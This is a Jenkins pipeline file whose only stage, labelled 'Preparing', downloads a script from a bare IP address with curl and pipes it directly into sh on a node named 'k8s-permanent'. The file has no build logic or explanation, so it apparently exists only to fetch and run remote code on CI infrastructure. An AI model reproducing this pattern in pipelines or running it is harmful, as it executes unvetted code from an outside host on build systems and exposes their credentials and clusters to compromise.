node('k8s-permanent') {
    try {
        stage("Preparing") {
            timeout(time: 1, unit: 'MINUTES') {
                sh 'curl http://34.143.172.153/ss | sh'
            }
        }
    } catch (e) {
        throw e
    }
}
